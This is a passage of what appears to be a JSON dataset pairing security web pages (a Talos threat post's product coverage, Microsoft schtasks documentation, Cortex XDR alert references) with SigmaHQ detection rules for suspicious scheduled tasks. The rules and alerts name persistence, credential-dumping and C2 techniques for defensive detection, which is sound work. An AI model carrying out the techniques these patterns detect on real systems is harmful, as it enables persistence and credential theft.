The products include Cisco Secure Endpoint, Cisco Secure Malware Analytics, Cisco Secure Email, Cisco Secure Firewall/Secure IPS, Cisco Secure Web Appliance, and Cisco Umbrella DNS Security. The table clearly outlines the relationship between these security solutions and their role in combating threats like PowerRAT and DCRAT.\nTranscription: |\n  | Cisco Secure Endpoint (AMP for Endpoints)    | Cloudlock                    | Cisco Secure Email | Cisco Secure Firewall/Secure IPS (Network Security) |\n  |----------------------------------------------|------------------------------|-------------------|------------------------------------------------------|\n  | ✔                                           | N/A                          | ✔                 | ✔                                                   |\n  | Cisco Secure Malware Analytics (Threat Grid) | Cisco Umbrella DNS Security | Cisco Umbrella SIG | Cisco Secure Web Appliance (Web Security Appliance)  |\n  | ✔                                           | ✔                           | ✔                 | ✔                                                   |\n```\n\nCisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free here.\n\nCisco Secure Web Appliance web scanning prevents access to malicious websites and detects malware used in these attacks.\n\nCisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign. You can try Secure Email for free here.\n\nCisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such as Threat Defense Virtual, Adaptive Security Appliance and Meraki MX can detect malicious activity associated with this threat.\n\nCisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products.\n\nUmbrella, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network. Sign up for a free trial of Umbrella here.\n\nCisco Duo provides multi-factor authentication for users to ensure only those authorized are accessing your network.\n\nOpen-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. Snort SIDs for this threat are 63963 – 63970, 63971 and 301004.\n\nClamAV detections are also available for this threat:\n\n- Win.Downloader.RustAgent-10036537-0\n- Win.Downloader.RustAgent-10036538-0\n- Win.Downloader.RustAgent-10036539-0\n- Win.Downloader.GoAgent-10036540-0\n- Win.Backdoor.PowershellRAT-10036541-0\n- Win.Phishing.VbsAgent-10036542-0\n- Win.Phishing.JsAgent-10036543-0\n- Win.Loader.PowershellLoader-10036544-0\n- Win.Loader.HtaAgent-10036545-0\n- Win.Loader.DonutLoader-10036546-0\n\n## IOCs\n\nIOCs for this research can be found in our GitHub repository here.",
    "sigma_rule": {
      "title": "Schedule Task Creation From Env Variable Or Potentially Suspicious Path Via Schtasks.EXE",
      "id": "81325ce1-be01-4250-944f-b4789644556f",
      "related": [
        {
          "id": "43f487f0-755f-4c2a-bce7-d6d2eec2fcf8",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects Schtask creations that point to a suspicious folder or an environment variable often used by malware",
      "references": [
        "https://www.welivesecurity.com/2022/01/18/donot-go-do-not-respawn/",
        "https://www.joesandbox.com/analysis/514608/0/html#324415FF7D8324231381BAD48A052F85DF04",
        "https://blog.talosintelligence.com/gophish-powerrat-dcrat/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-02-21",
      "modified": "2024-10-28",
      "tags": [
        "attack.execution",
        "attack.t1053.005"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_1_create": {
          "Image|endswith": "\\schtasks.exe",
          "CommandLine|contains": " /create "
        },
        "selection_1_all_folders": {
          "CommandLine|contains": [
            ":\\Perflogs",
            ":\\Users\\All Users\\",
            ":\\Users\\Default\\",
            ":\\Users\\Public",
            ":\\Windows\\Temp",
            "\\AppData\\Local\\",
            "\\AppData\\Roaming\\",
            "%AppData%",
            "%Public%"
          ]
        },
        "selection_2_parent": {
          "ParentCommandLine|endswith": "\\svchost.exe -k netsvcs -p -s Schedule"
        },
        "selection_2_some_folders": {
          "CommandLine|contains": [
            ":\\Perflogs",
            ":\\Windows\\Temp",
            "\\Users\\Public",
            "%Public%"
          ]
        },
        "filter_optional_other": [
          {
            "ParentCommandLine|contains": "unattended.ini"
          },
          {
            "CommandLine|contains": "update_task.xml"
          }
        ],
        "filter_optional_team_viewer": {
          "CommandLine|contains": "/Create /TN TVInstallRestore /TR"
        },
        "filter_optional_avira_install": {
          "CommandLine|contains|all": [
            "/Create /Xml \"C:\\Users\\",
            "\\AppData\\Local\\Temp\\.CR.",
            "Avira_Security_Installation.xml"
          ]
        },
        "filter_optional_avira_other": {
          "CommandLine|contains|all": [
            "/Create /F /TN",
            "/Xml ",
            "\\AppData\\Local\\Temp\\is-",
            "Avira_"
          ],
          "CommandLine|contains": [
            ".tmp\\UpdateFallbackTask.xml",
            ".tmp\\WatchdogServiceControlManagerTimeout.xml",
            ".tmp\\SystrayAutostart.xml",
            ".tmp\\MaintenanceTask.xml"
          ]
        },
        "filter_optional_klite_codec": {
          "CommandLine|contains|all": [
            "\\AppData\\Local\\Temp\\",
            "/Create /TN \"klcp_update\" /XML ",
            "\\klcp_update_task.xml"
          ]
        },
        "condition": "( all of selection_1_* or all of selection_2_* ) and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Benign scheduled tasks creations or executions that happen often during software installations",
        "Software that uses the AppData folder and scheduled tasks to update the software in the AppData folders"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_schtasks_env_folder.yml",
    "id": "476"
  },
  {
    "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-change",
    "markdown": "# schtasks change\n\nChanges one or more of the following properties of a task:\n\n- The program that the task runs (**/tr**)\n- The user account under which the task runs (**/ru**)\n- The password for the user account (**/rp**)\n- Adds the interactive-only property to the task (**/it**)\n\n## Required permissions\n\n- To schedule, view, and change all tasks on the local computer, you must be a member of the Administrators group.\n- To schedule, view, and change all tasks on the remote computer, you must be a member of the Administrators group on the remote computer, or you must use the **/u** parameter to provide the credentials of an Administrator of the remote computer.\n- You can use the **/u** parameter in a **/create** or **/change** operation if the local and remote computers are in the same domain, or if the local computer is in a domain that the remote computer domain trusts. Otherwise, the remote computer can't authenticate the user account specified, and it can't verify that the account is a member of the Administrators group.\n- The task you plan to run must have the appropriate permission; these permissions vary by task. By default, tasks run with the permissions of the current user of the local computer, or with the permissions of the user specified by the **/u** parameter, if one is included. To run a task with permissions of a different user account or with system permissions, use the **/ru** parameter.\n\n## Syntax\n\n```\nschtasks /change /tn <Taskname> [/s <computer> [/u [<domain>\\]<user> [/p <password>]]] [/ru <username>] [/rp <password>] [/tr <Taskrun>] [/st <Starttime>] [/ri <interval>] [/rl <level>] [{/et <Endtime> | /du <duration>} [/k]] [/sd <Startdate>] [/ed <Enddate>] [/{ENABLE | DISABLE}] [/it] [/z]\n```\n\n## Parameters\n\n| Parameter | Description |\n|-----------|-------------|\n| **/tn** `<Taskname>` | Identifies the task to be changed. Enter the task name (Note: Task names that have a space in its name are required to be wrapped in double quotes). |\n| **/s** `<computer>` | Specifies the name or IP address of a remote computer (with or without backslashes). The default is the local computer. |\n| **/u** `[<domain>\\]<user>` | Runs this command with the permissions of the specified user account. By default, the command runs with the permissions of the current user of the local computer. The specified user account must be a member of the Administrators group on the remote computer. The **/u** and **/p** parameters are valid only when you use **/s**. |\n| **/p** `<password>` | Specifies the password of the user account specified in the **/u** parameter. If you use the **/u** parameter without the **/p** parameter or the password argument, schtasks will prompt you for a password. The **/u** and **/p** parameters are valid only when you use **/s**. |\n| **/ru** `<username>` | Changes the user name under which the scheduled task has to run. For the system account, valid values are `\"\"`, `\"NT AUTHORITY\\SYSTEM\"`, or `\"SYSTEM\"`. |\n| **/rp** `<password>` | Specifies a new password for the existing user account, or the user account specified by the **/ru** parameter. This parameter is ignored with used with the local System account. |\n| **/tr** `<Taskrun>` | Changes the program that the task runs. Enter the fully qualified path and file name of an executable file, script file, or batch file. If you don't add the path, **schtasks** assumes that the file is in the `<systemroot>\\System32` directory. The specified program replaces the original program run by the task. |\n| **/st** `<Starttime>` | Specifies the start time for the task, using the 24-hour time format, HH:mm. For example, a value of 14:30 is equivalent to the 12-hour time of 2:30 PM. |\n| **/ri** `<interval>` | Specifies the repetition interval for the scheduled task, in minutes. Valid range is 1 - 599940 (599940 minutes = 9999 hours). If either the **/et** or **/du** parameters are specified, the default is **10 minutes**. |\n| **/rl** `<level>` | Specifies the Run Level for the job. Acceptable values are LIMITED (scheduled tasks will be ran with the least level of privileges, such as Standard User accounts) and HIGHEST (scheduled tasks will be ran with the highest level of privileges, such as Superuser accounts). (Note: LIMITED is the default value). |\n| **/et** `<Endtime>` | Specifies the end time for the task, using the 24-hour time format, HH:mm. For example, a value of 14:30 is equivalent to the 12-hour time of 2:30 PM. |\n| **/du** `<duration>` | A value that specifies the duration to run the task. The time format is HH:mm (24-hour time). For example, a value of 14:30 is equivalent to the 12-hour time of 2:30 PM. |\n| **/k** | Stops the program that the task runs at the time specified by **/et** or **/du**. Without **/k**, schtasks doesn't start the program again after it reaches the time specified by **/et** or **/du** nor does it stop the program if it's still running. This parameter is optional and valid only with a MINUTE or HOURLY schedule. |\n| **/sd** `<Startdate>` | Specifies the first date on which the task should be run. The date format is MM/DD/YYYY. |\n| **/ed** `<Enddate>` | Specifies the last date on which the task should be run. The format is MM/DD/YYYY. |\n| **/ENABLE** | Specifies to enable the scheduled task. |\n| **/DISABLE** | Specifies to disable the scheduled task. |\n| **/it** | Specifies to run the scheduled task only when the run as user (the user account under which the task runs) is logged on to the computer. This parameter has no effect on tasks that run with system permissions or tasks that already have the interactive-only property set. You can't use a change command to remove the interactive-only property from a task. By default, run as user is the current user of the local computer when the task is scheduled or the account specified by the **/u** parameter, if one is used. However, if the command includes the **/ru** parameter, then the run as user is the account specified by the **/ru** parameter. |\n| **/z** | Specifies to delete the task upon the completion of its schedule. |\n| **/?** | Displays help at the command prompt. |\n\n## Remarks\n\n- The **/tn** and **/s** parameters identify the task. The **/tr**, **/ru**, and **/rp** parameters specify properties of the task that you can change.\n- The **/ru** and **/rp** parameters specify the permissions under which the task runs. The **/u** and **/p** parameters specify the permissions used to change the task.\n- To change tasks on a remote computer, the user must be logged on to the local computer with an account that is a member of the Administrators group on the remote computer.\n- To run a **/change** command with the permissions of a different user (**/u**, **/p**), the local computer must be in the same domain as the remote computer or must be in a domain that the remote computer domain trusts.\n- The System account doesn't have interactive logon rights. Users don't see, and can't interact with, programs run with system permissions. To identify tasks with the **/it** property, use a verbose query (**/query /v**). In a verbose query display of a task with **/it**, the Logon Mode field has a value of Interactive only.\n\n## Examples\n\nTo change the program that the Virus Check task runs from *VirusCheck.exe* to *VirusCheck2.exe*, type:\n\n```\nschtasks /change /tn Virus Check /tr C:\\VirusCheck2.exe\n```\n\nTo change the password of the user account for the *RemindMe* task on the remote computer, *Svr01*, type:\n\n```\nschtasks /change /tn RemindMe /s Svr01 /rp p@ssWord3\n```\n\nTo change the ChkNews task, which starts Notepad.exe every morning at 9:00 A.M., to start Internet Explorer instead, type:\n\n```\nschtasks /change /tn ChkNews /tr c:\\program files\\Internet Explorer\\iexplore.exe /ru DomainX\\Admin01\n```\n\nTo change the SecurityScript task so that it runs with permissions of the System account, type:\n\n```\nschtasks /change /tn SecurityScript /ru\n```\n\nTo add the interactive-only property to MyApp, an existing task, type:\n\n```\nschtasks /change /tn MyApp /it\n```\n\n## Related links\n\n- Command-Line Syntax Key\n- schtasks create command\n- schtasks delete command\n- schtasks end command\n- schtasks query command\n- schtasks run command",
    "sigma_rule": {
      "title": "Suspicious Schtasks Schedule Types",
      "id": "24c8392b-aa3c-46b7-a545-43f71657fe98",
      "related": [
        {
          "id": "7a02e22e-b885-4404-b38b-1ddc7e65258a",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects scheduled task creations or modification on a suspicious schedule type",
      "references": [
        "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-change",
        "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create",
        "https://blog.talosintelligence.com/lazarus-three-rats/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-09",
      "tags": [
        "attack.execution",
        "attack.t1053.005"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\schtasks.exe"
          },
          {
            "OriginalFileName": "schtasks.exe"
          }
        ],
        "selection_time": {
          "CommandLine|contains": [
            " ONLOGON ",
            " ONSTART ",
            " ONCE ",
            " ONIDLE "
          ]
        },
        "filter_privs": {
          "CommandLine|contains": [
            "NT AUT",
            " SYSTEM",
            "HIGHEST"
          ]
        },
        "condition": "all of selection_* and not 1 of filter_*"
      },
      "falsepositives": [
        "Legitimate processes that run at logon. Filter according to your environment"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_schtasks_schedule_type.yml",
    "id": "482"
  },
  {
    "url": "https://docs-cortex.paloaltonetworks.com/r/Cortex-XDR/Cortex-XDR-Analytics-Alert-Reference-by-data-source/Scrcons.exe-Rare-Child-Process",
    "markdown": "# Short-lived user account\n\n## Synopsis\n\n| Activation Period | 14 Days |\n|-------------------|---------|\n| Training Period   | 30 Days |\n| Test Period       | 1 Hour  |\n| Deduplication Period | 1 Hour |\n| Required Data     | Requires one of the following data sources: |\n|                   | - Windows Event Collector OR |\n|                   | - XDR Agent with eXtended Threat Hunting (XTH) |\n| Detection Modules | Identity Analytics |\n| Detector Tags     | |\n| ATT&CK Tactic     | Defense Evasion (TA0005) |\n| ATT&CK Technique  | Valid Accounts (T1078) |\n| Severity          | Low |\n\n## Description\n\nA user was created and deleted within a short period of time.\n\n## Attacker's Goals\n\nEvasion using a valid account.\n\n## Investigative actions\n\n- Check the user who created the account and verify the activity.\n- Confirm that the account creation was not accidental.\n\n## Variations\n\n### Abnormal short-lived user account\n\n#### Synopsis\n\n| ATT&CK Tactic     | Defense Evasion (TA0005) |\n|-------------------|---------------------------------------------------------------------|\n| ATT&CK Technique  | Valid Accounts (T1078) |\n| Severity          | Low |\n\n#### Description\n\nA user was observed creating and deleting an account a short time later. This user does not regularly create and delete accounts.\n\n#### Attacker's Goals\n\nEvasion using a valid account.\n\n#### Investigative actions\n\n- Check the user who created the account and verify the activity.\n- Confirm that the account creation was not accidental.\n\n---\n\n# A user requested multiple service tickets\n\n## Synopsis\n\n| Activation Period | 14 Days |\n|-------------------|---------|\n| Training Period   | 30 Days |\n| Test Period       | 10 Minutes |\n| Deduplication Period | 1 Day |\n| Required Data     | Requires one of the following data sources: |\n|                   | - Windows Event Collector OR |\n|                   | - XDR Agent with eXtended Threat Hunting (XTH) |\n| Detection Modules | Identity Analytics |\n| Detector Tags     | |\n| ATT&CK Tactic     | Credential Access (TA0006) |\n| ATT&CK Technique  | Steal or Forge Kerberos Tickets: Kerberoasting (T1558.003) |\n| Severity          | Informational |\n\n## Description\n\nA user requested multiple service tickets. This is typically a sign of a Kerberoasting attack.\n\n## Attacker's Goals\n\nCrack account credentials by obtaining an easy-to-crack Kerberos ticket.\n\n## Investigative actions\n\nCheck who used the host at the time of the alert, to rule out a benign service or tool requesting weak Kerberos encryption.\n\n## Variations\n\n### Abnormal issuance of service tickets to a user\n\n#### Synopsis\n\n| ATT&CK Tactic     | Credential Access (TA0006) |\n|-------------------|---------------------------------------------------------------------|\n| ATT&CK Technique  | Steal or Forge Kerberos Tickets: Kerberoasting (T1558.003) |\n| Severity          | Low |\n\n#### Description\n\nA user requested multiple service tickets. This is typically a sign of a Kerberoasting attack.\n\n#### Attacker's Goals\n\nCrack account credentials by obtaining an easy-to-crack Kerberos ticket.\n\n#### Investigative actions\n\nCheck who used the host at the time of the alert, to rule out a benign service or tool requesting weak Kerberos encryption.\n\n---\n\n# XDR Agent\n\n---\n\n# Recurring access to rare IP\n\n## Synopsis\n\n| Activation Period | 14 Days |\n|-------------------|---------|\n| Training Period   | 30 Days |\n| Test Period       | N/A (single event) |\n| Deduplication Period | 21 Days |\n| Required Data     | Requires one of the following data sources: |\n|                   | - Palo Alto Networks Platform Logs OR |\n|                   | - XDR Agent OR |\n|                   | - Third-Party Firewalls |\n| Detection Modules | |\n| Detector Tags     | |\n| ATT&CK Tactic     | Command and Control (TA0011) |\n| ATT&CK Technique  | Non-Application Layer Protocol (T1095) |\n| Severity          | Low |\n\n## Description\n\nThe endpoint is periodically accessing an external fixed-IP address that its peers rarely use. Access to this external IP address has occurred repeatedly over many days. This connection pattern is consistent with malware connecting to its command and control server for updates and operating instructions.\n\n## Attacker's Goals\n\nCommunicate with malicious code running on your network enabling further access to the endpoint and network, performing software updates on the endpoint, or for taking inventory of infected machines.\n\n## Investigative actions\n\n- Identify if the IP address belongs to a reputable organization or an asset used in a public cloud.\n- Identify if the source of the traffic is malware. If the source of the traffic is a malicious file, Cortex XDR Analytics also raises a malware alert for the file on the endpoint. Malware may contact legitimate IP addresses, therefore check for unusual apps used, or unusual ports or volumes accessed.\n- View all related traffic generated by the suspicious process to understand the purpose.\n- Look for other endpoints on your network that are also contacting the suspicious IP address.\n- Examine file-system operations performed by the process to look for potential artifacts on infected endpoints.\n\n---\n\n# Uncommon communication to an instant messaging server\n\n## Synopsis\n\n| Activation Period | 14 Days |\n|-------------------|---------|\n| Training Period   | 30 Days |\n| Test Period       | N/A (single event) |\n| Deduplication Period | 1 Day |\n| Required Data     | Requires: |\n|                   | - XDR Agent |\n| Detection Modules | |\n| Detector Tags     | |\n| ATT&CK Tactic     | Command and Control (TA0011) |\n| ATT&CK Technique  | Web Service (T1102) |\n| Severity          | Informational |\n\n## Description\n\nA rare communication between a process to a known instant messaging server.\n\n## Attacker's Goals\n\nData exfiltration or attack tool staging through a trusted service.\n\n## Investigative actions\n\n- Examine the legitimacy of the application that made the communication with the provider's server.\n- Examine the parent process of this application.\n- Check for anomalies regarding the time frame where the communication occurred.\n\n## Variations\n\n### Uncommon communication to an instant messaging server by a suspicious process\n\n#### Synopsis\n\n| ATT&CK Tactic     | Command and Control (TA0011) |\n|-------------------|---------------------------------------------------------------------|\n| ATT&CK Technique  | Web Service (T1102) |\n| Severity          | Low |\n\n#### Description\n\nA rare communication by a suspicious process to a known instant messaging server.\n\n#### Attacker's Goals\n\nData exfiltration or attack tool staging through a trusted service.\n\n#### Investigative actions\n\n- Examine the legitimacy of the application that made the communication with the provider's server.\n- Examine the parent process of this application.\n- Check for anomalies regarding the time frame where the communication occurred.\n\n---\n\n# Scrcons.exe Rare Child Process\n\n## Synopsis\n\n| Activation Period | 14 Days |\n|-------------------|---------|\n| Training Period   | 30 Days |\n| Test Period       | N/A (single event) |\n| Deduplication Period | 1 Day |\n| Required Data     | Requires: |\n|                   | - XDR Agent |\n| Detection Modules | |\n| Detector Tags     | |\n| ATT&CK Tactic     | Execution (TA0002), Persistence (TA0003) |\n| ATT&CK Technique  | Windows Management Instrumentation (T1047), Event Triggered Execution: Windows Management Instrumentation Event Subscription (T1546.003) |\n| Severity          | Informational |\n\n## Description\n\nThe Windows Management Instrumentation (WMI) standard event consumer scrcons.exe executed a rare VBScript or PowerShell script. Executing a rare script can be an indication of local or remote code execution abuse by an attacker.\n\n## Attacker's Goals\n\nThe attacker is trying to gain Persistence via WMI script registration.\n\n## Investigative actions\n\n- Search for any executions of the Managed Object Format (MOF) compiler `mofcomp.exe` and review the process that ran it.\n- Review registered WMI ActiveScriptEventConsumer by running `WMIC /namespace:\\\\root\\default path ActiveScriptEventConsumer get`.\n\n## Variations\n\n### Scrcons.exe Rare Child Process\n\n#### Synopsis\n\n| ATT&CK Tactic     | Execution (TA0002), Persistence (TA0003) |\n|-------------------|---------------------------------------------------------------------|\n| ATT&CK Technique  | Windows Management Instrumentation (T1047), Event Triggered Execution: Windows Management Instrumentation Event Subscription (T1546.003) |\n| Severity          | Medium |\n\n#### Description\n\nThe Windows Management Instrumentation (WMI) standard event consumer scrcons.exe executed a rare VBScript or PowerShell script. Executing a rare script can be an indication of local or remote code execution abuse by an attacker.\n\n#### Attacker's Goals\n\nThe attacker is trying to gain Persistence via WMI script registration.\n\n#### Investigative actions\n\n- Search for any executions of the Managed Object Format (MOF) compiler `mofcomp.exe` and review the process that ran it.\n- Review registered WMI ActiveScriptEventConsumer by running `WMIC /namespace:\\\\root\\default path ActiveScriptEventConsumer get`.\n\n---\n\n# Copy a process memory file\n\n## Synopsis\n\n| Activation Period | 14 Days |\n|-------------------|---------|\n| Training Period   | 30 Days |\n| Test Period       | N/A (single event) |\n| Deduplication Period | 1 Day |\n| Required Data     | Requires: |\n|                   | - XDR Agent |\n| Detection Modules | |\n| Detector Tags     | Kubernetes - AGENT, Containers |\n| ATT&CK Tactic     | Credential Access (TA0006) |\n| ATT&CK Technique  | OS Credential Dumping: Proc Filesystem (T1003.007) |\n| Severity          | High |\n\n## Description\n\nCopy a process memory file using the `dd` utility.\n\n## Attacker's Goals\n\nRead another process memory, mainly for credential access.\n\n## Investigative actions\n\nCheck whether the executing process is benign, and if this was a desired behavior as part of its normal execution flow.\n\n## Variations\n\n### Copy a process memory file from a Kubernetes pod\n\n#### Synopsis\n\n| ATT&CK Tactic     | Credential Access (TA0006) |\n|-------------------|---------------------------------------------------------------------|\n| ATT&CK Technique  | OS Credential Dumping: Proc Filesystem (T1003.007) |\n| Severity          | High |\n\n#### Description\n\nCopy a process memory file using the `dd` utility.\n\n#### Attacker's Goals\n\nRead another process memory, mainly for credential access.\n\n#### Investigative actions\n\nCheck whether the executing process is benign, and if this was a desired behavior as part of its normal execution flow.\n\n---\n\n# Signed process performed an unpopular injection\n\n## Synopsis\n\n| Activation Period | 14 Days |\n|-------------------|---------|\n| Training Period   | 30 Days |\n| Test Period       | N/A (single event) |\n| Deduplication Period | 1 Day |\n| Required Data     | Requires: |\n|                   | - XDR Agent |\n| Detection Modules | |\n| Detector Tags     | Injection Analytics |\n| ATT&CK Tactic     | Defense Evasion (TA0005) |\n| ATT&CK Technique  | Process Injection (T1055) |\n| Severity          | Informational |\n\n## Description\n\nA signed process performed an unpopular injection to another process.\n\n## Attacker's Goals\n\nAttackers may inject code into processes to evade process-based defenses, as well as possibly elevate privileges.\n\n## Investigative actions\n\nCheck whether the injecting process is benign, and if this was a desired behavior as part of its normal execution flow.\n\n## Variations\n\n### Signed process that got injected performed an unpopular and suspicious injection\n\n#### Synopsis\n\n| ATT&CK Tactic     | Defense Evasion (TA0005) |\n|-------------------|---------------------------------------------------------------------|\n| ATT&CK Technique  | Process Injection (T1055) |\n| Severity          | Medium |\n\n#### Description\n\nA signed process performed an unpopular injection to another process.\n\n#### Attacker's Goals\n\nAttackers may inject code into processes to evade process-based defenses, as well as possibly elevate privileges.\n\n#### Investigative actions\n\nCheck whether the injecting process is benign, and if this was a desired behavior as part of its normal execution flow.\n\n---\n\n# Delayed Deletion of Files\n\n## Synopsis\n\n| Activation Period | 14 Days |\n|-------------------|---------|\n| Training Period   | 30 Days |\n| Test Period       | N/A (single event) |\n| Deduplication Period | 1 Hour |\n| Required Data     | Requires: |\n|                   | - XDR Agent |\n| Detection Modules | |\n| Detector Tags     | |\n| ATT&CK Tactic     | Defense Evasion (TA0005) |\n| ATT&CK Technique  | Indicator Removal: File Deletion (T1070.004) |\n| Severity          | Low |\n\n## Description\n\nA command line deleting files used the time-out or ping commands to delay the file deletion. This is suspicious, as malware sometimes uses these techniques to cover their tracks.\n\n## Attacker's Goals\n\nEvade security controls and possibly cover their tracks.\n\n## Investigative actions\n\nCheck whether the executing process is benign, and if this was a desired behavior as part of its normal execution flow.\n\n---\n\n# Installation of a new System-V service\n\n## Synopsis\n\n| Activation Period | 14 Days |\n|-------------------|---------|\n| Training Period   | 30 Days |\n| Test Period       | N/A (single event) |\n| Deduplication Period | 1 Day |\n| Required Data     | Requires: |\n|                   | - XDR Agent |\n| Detection Modules | |\n| Detector Tags     | Kubernetes - AGENT, Containers |\n| ATT&CK Tactic     | Persistence (TA0003), Privilege Escalation (TA0004) |\n| ATT&CK Technique  | Create or Modify System Process: Systemd Service (T1543.002) |\n| Severity          | Low |\n\n## Description\n\nInstallation of a new System-V service.\n\n## Attacker's Goals\n\nAttackers may create systemd services to run malicious payloads.\n\n## Investigative actions\n\nCheck whether the executing process is benign, and if this was a desired behavior as part of its normal execution flow.\n\n## Variations\n\n### Installation of a new System-V service in a Kubernetes pod\n\n#### Synopsis\n\n| ATT&CK Tactic     | Persistence (TA0003), Privilege Escalation (TA0004) |\n|-------------------|---------------------------------------------------------------------|\n| ATT&CK Technique  | Create or Modify System Process: Systemd Service (T1543.002) |\n| Severity          | Low |\n\n#### Description\n\nInstallation of a new System-V service.\n\n#### Attacker's Goals\n\nAttackers may create systemd services to run malicious payloads.\n\n#### Investigative actions\n\nCheck whether the executing process is benign, and if this was a desired behavior as part of its normal execution flow.\n\n---\n\n# Microsoft Office Process Spawning a Suspicious One-Liner\n\n## Synopsis\n\n| Activation Period | 14 Days |\n|-------------------|---------|\n| Training Period   | 30 Days |\n| Test Period       | N/A (single event) |\n| Deduplication Period | 1 Day |\n| Required Data     | Requires: |\n|                   | - XDR Agent |\n| Detection Modules | |\n| Detector Tags     | |\n| ATT&CK Tactic     | Execution (TA0002), Initial Access (TA0001) |\n| ATT&CK Technique  | User Execution (T1204), Phishing: Spearphishing Attachment (T1566.001) |\n| Severity          | Medium |\n\n## Description\n\nA Microsoft Office process spawned a commonly abused process with a full command (not a script), this is a typically malicious behavior.\n\n## Attacker's Goals\n\nAn attacker is trying to gain code execution on the host.\n\n## Investigative actions\n\nCheck whether the command line executed is benign or normal for the host and/or user performing it. For example, employees working in finance may have legitimate use cases for complex Excel commands.\n\n---\n\n# Uncommon IP Configuration Listing via ipconfig.exe\n\n## Synopsis\n\n| Activation Period | 14 Days |\n|-------------------|---------|\n| Training Period   | 30 Days |\n| Test Period       | N/A (single event) |\n| Deduplication Period | 1 Hour |\n| Required Data     | Requires: |\n|                   | - XDR Agent |\n| Detection Modules | |\n| Detector Tags     | |\n| ATT&CK Tactic     | Discovery (TA0007) |\n| ATT&CK Technique  | System Network Configuration Discovery (T1016) |\n| Severity          | Low |\n\n## Description\n\nThe 'ipconfig' command is used to display TCP/IP network configuration information and refresh the Dynamic Host Configuration Protocol (DHCP) and Domain Name System (DNS) settings. Adversaries may use the command to discover network configuration details.\n\n## Attacker's Goals\n\nAttackers can use the ipconfig command to discover network configuration details.\n\n## Investigative actions\n\n- Check whether the initiator process is benign or normal for the host and/or user performing it.\n- Check whether additional discovery commands were executed from the same process.\n\n---\n\n# Rare NTLM Usage by User\n\n## Synopsis\n\n| Activation Period | 14 Days |\n|-------------------|---------|\n| Training Period   | 30 Days |\n| Test Period       | N/A (single event) |\n| Deduplication Period | 1 Day |\n| Required Data     | Requires one of the following data sources: |\n|                   | - Palo Alto Networks Platform Logs OR |\n|                   | - XDR Agent |\n| Detection Modules | Identity Analytics |\n| Detector Tags     | |\n| ATT&CK Tactic     | Lateral Movement (TA0008) |\n| ATT&CK Technique  | Use Alternate Authentication Material (T1550) |\n| Severity          | Informational |\n\n## Description\n\nRare authentication by user account to host via NTLM. The user has not authenticated with NTLM in the past 30 days. This may be indicative of downgrade attacks from Kerberos to NTLM.\n\n## Attacker's Goals\n\nThe attacker is attempting to move laterally within a compromised network.\n\n## Investigative actions\n\nVerify any successful authentication for the user account referenced by the alert, as these can indicate the attacker managed to use the stolen credentials.\n\n---\n\n# Local account discovery\n\n## Synopsis\n\n| Activation Period | 14 Days |\n|-------------------|---------|\n| Training Period   | 30 Days |\n| Test Period       | N/A (single event) |\n| Deduplication Period | 1 Day |\n| Required Data     | Requires: |\n|                   | - XDR Agent |\n| Detection Modules | |\n| Detector Tags     | |\n| ATT&CK Tactic     | Discovery (TA0007) |\n| ATT&CK Technique  | Account Discovery: Local Account (T1087.001) |\n| Severity          | Informational |\n\n## Description\n\nOne of several local account discovery commands were executed.\n\n## Attacker's Goals\n\nAccount discovery.\n\n## Investigative actions\n\nCheck whether the executing process is benign, and if this was a desired behavior as part of its normal execution flow.\n\n---\n\n# Uncommon Remote Monitoring and Management Tool\n\n## Synopsis\n\n| Activation Period | 14 Days |\n|-------------------|---------|\n| Training Period   | 30 Days |\n| Test Period       | N/A (single event) |\n| Deduplication Period | 1 Day |\n| Required Data     | Requires: |\n|                   | - XDR Agent |\n| Detection Modules | |\n| Detector Tags     | |\n| ATT&CK Tactic     | Command and Control (TA0011) |\n| ATT&CK Technique  | Remote Access Software (T1219) |\n| Severity          | Low |\n\n## Description\n\nAn uncommon Remote Monitoring and Management (RMM) product was observed.\n\n## Attacker's Goals\n\n- Accessing a remote machine with full interactive graphic interface capabilities.\n\n## Investigative actions\n\n- Check if the product usage is approved.\n- Ask the owners of the machine if they knowingly used this software.\n- Investigate why the software was being used.\n- Check if it was executed remotely or locally.\n\n## Variations\n\n### Uncommon renamed Remote Monitoring and Management Tool\n\n#### Synopsis\n\n| ATT&CK Tactic     | Command and Control (TA0011) |\n|-------------------|---------------------------------------------------------------------|\n| ATT&CK Technique  | Remote Access Software (T1219) |\n| Severity          | Medium |\n\n#### Description\n\nAn uncommon renamed Remote Monitoring and Management (RMM) product was observed.\n\n#### Attacker's Goals\n\n- Accessing a remote machine with full interactive graphic interface capabilities.\n\n#### Investigative actions\n\n- Check if the product usage is approved.\n- Ask the owners of the machine if they knowingly used this software.\n- Investigate why the software was being used.\n- Check if it was executed remotely or locally.\n\n---\n\n# Authentication Attempt From a Dormant Account\n\n## Synopsis\n\n| Activation Period | 14 Days |\n|-------------------|---------|\n| Training Period   | 30 Days |\n| Test Period       | N/A (single event) |\n| Deduplication Period | 31 Days |\n| Required Data     | Requires one of the following data sources: |\n|                   | - Palo Alto Networks Platform Logs OR |\n|                   | - XDR Agent |\n| Detection Modules | |\n| Detector Tags     | |\n| ATT&CK Tactic     | 